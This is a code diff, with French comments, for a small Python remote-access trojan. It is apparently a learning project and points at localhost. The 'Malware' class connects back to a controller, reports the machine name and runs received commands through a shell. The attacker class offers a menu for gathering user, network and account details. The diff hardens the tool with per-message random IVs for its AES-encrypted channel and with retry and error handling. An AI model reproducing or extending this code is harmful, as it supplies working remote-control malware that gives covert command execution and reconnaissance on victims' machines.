@@ -1,6 +1,7 @@
 import socket, os, sys, time
 import subprocess
 from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 from base64 import b64encode, b64decode
 """
 Classe contenant les variables communes entre client et serveur
@@ -10,15 +11,17 @@ Classe contenant les variables communes entre client et serveur
 class Machine:
     def __init__(self):
         self.server_addr = ("localhost", 60000)
-        self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        except socket.error:
+            print("Socket cannot be created!")
         self.language = "utf-8"
         self.buffsize = 4096
         self.key = b'AcVfgTjpKumnVftH'
-        self.iv = b'16EtPy5Bk6X18Dtp'
 
 
 """
-Classe contenant les fonctions pour le client
+Classe contenant les fonctions pour la machine infectée
 """
 
 
@@ -28,35 +31,34 @@ class Malware(Machine):
 
     def start(self):
         try:
+            print("try to co ....")
             self.my_socket.connect(self.server_addr)
             self.send(os.environ["COMPUTERNAME"])
             time.sleep(1)
         except socket.error:
-            time.sleep(10)
+            time.sleep(3)
             self.start()
 
     def send(self, message):
-        raw = message.encode(self.language)
-        cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
-        encrypted = b64encode(self.iv + cipher.encrypt(raw))
+        send_b = message.encode(self.language)
+        iv = get_random_bytes(16)
+        cipher = AES.new(self.key, AES.MODE_CFB, iv)
+        encrypted = b64encode(iv + cipher.encrypt(send_b))
         self.my_socket.send(encrypted)
 
     def receive(self):
-        enc = self.my_socket.recv(self.buffsize).decode(self.language)
-        enc = b64decode(enc)
-        iv = enc[:16]
-        cipher = AES.new(self.key, AES.MODE_CFB, iv)
-        cmd = cipher.decrypt(enc[16:]).decode(self.language)
-        return cmd
+        try:
+            enc = self.my_socket.recv(self.buffsize).decode(self.language)
+            enc = b64decode(enc)
+            iv = enc[:16]
+            cipher = AES.new(self.key, AES.MODE_CFB, iv)
+            return cipher.decrypt(enc[16:]).decode(self.language)
+        except ConnectionResetError:
+            self.quit()
 
     def quit(self):
-        try:
-            print("quitting")
-            time.sleep(3)
-            self.my_socket.close()
-        except:
-            print("Nous avons quitter avec une erreur")
-            time.sleep(3)
+        time.sleep(3)
+        self.my_socket.close()
 
     def rev_shell(self, cmd):
         var = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -66,7 +68,7 @@ class Malware(Machine):
 
 
 """
-Classe contenant les fonction pour le malware
+Classe contenant les fonction pour l'attaquant
 """
 
 
@@ -75,33 +77,52 @@ class Client(Machine):
         super().__init__()
 
     def start(self):
-        self.my_socket.bind(self.server_addr)
-        self.my_socket.listen()
+        try:
+            self.my_socket.bind(self.server_addr)
+            self.my_socket.listen()
+        except socket.error:
+            print("Socket cant be binded!")
+            self.quit_error()
 
-    def bind(self):
+    def conn(self):
         global distant_socket, addr, hostname
         distant_socket, addr = self.my_socket.accept()
         print("Connection accepted for :", addr)
-        hostname = distant_socket.recv(self.buffsize).decode(self.language)
+        hostname = self.receive()
         print("The malware has infected the machine named " + str(hostname) + "\n")
 
     def send(self, commande):
-        raw = commande.encode(self.language)
-        cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
-        encrypted = b64encode(self.iv + cipher.encrypt(raw))
-        distant_socket.send(encrypted)
+        try:
+            send_b = commande.encode(self.language)
+            iv = get_random_bytes(16)
+            cipher = AES.new(self.key, AES.MODE_CFB, iv)
+            encrypted = b64encode(iv + cipher.encrypt(send_b))
+            distant_socket.send(encrypted)
+        except ConnectionResetError:
+            print("Connection lost with the infected machine")
+            self.quit_error()
 
     def receive(self):
         enc = distant_socket.recv(self.buffsize).decode(self.language)
         enc = b64decode(enc)
         iv = enc[:16]
         cipher = AES.new(self.key, AES.MODE_CFB, iv)
-        print(cipher.decrypt(enc[16:]).decode(self.language), end="")
+        return cipher.decrypt(enc[16:]).decode(self.language)
 
     def quit(self):
         print("Shutting down in 3 seconds")
         time.sleep(3)
         distant_socket.close()
+        self.my_socket.close()
+        sys.exit()
+
+    def quit_error(self):
+        print("Closing this session in 3 seconds.")
+        time.sleep(1)
+        print("... 2")
+        time.sleep(1)
+        print(".. 1")
+        time.sleep(1)
         self.my_socket.close()
         sys.exit()
 
@@ -121,26 +142,29 @@ class Client(Machine):
             if choix2 == "1":
                 self.send("computer")
                 print("\nComputer name : ", end="")
-                self.receive()
+                print(self.receive())
             elif choix2 == "2":
                 self.send("current")
                 print("\nCurrent user : ", end="")
-                self.receive()
+                print(self.receive())
             elif choix2 == "3":
                 self.send("network")
-                print("\nNetwork config : ", end="")
-                self.receive()
+                print(self.receive())
             elif choix2 == "4":
                 self.send("users")
-                self.receive()
+                print(self.receive())
             else:
-                print("Enter a valid value!")
+                print("Enter a valid value!\n")
 
-            print("\n\nPress 1 to get the infected computer name")
-            print("Press 2 to see who is the current user")
-            print("Press 3 to get the network configuration")
-            print("Press 4 to get the list of users")
-            print("Press 0 to quit")
-            choix2 = input()
+            choix2 = self.affiche_choix()
+
         self.send("quit")
         self.quit()
+
+    def affiche_choix(self):
+        print("\nPress 1 to get the infected computer name")
+        print("Press 2 to see who is the current user")
+        print("Press 3 to get the network configuration")
+        print("Press 4 to get the list of users")
+        print("Press 0 to quit")
+        return input()
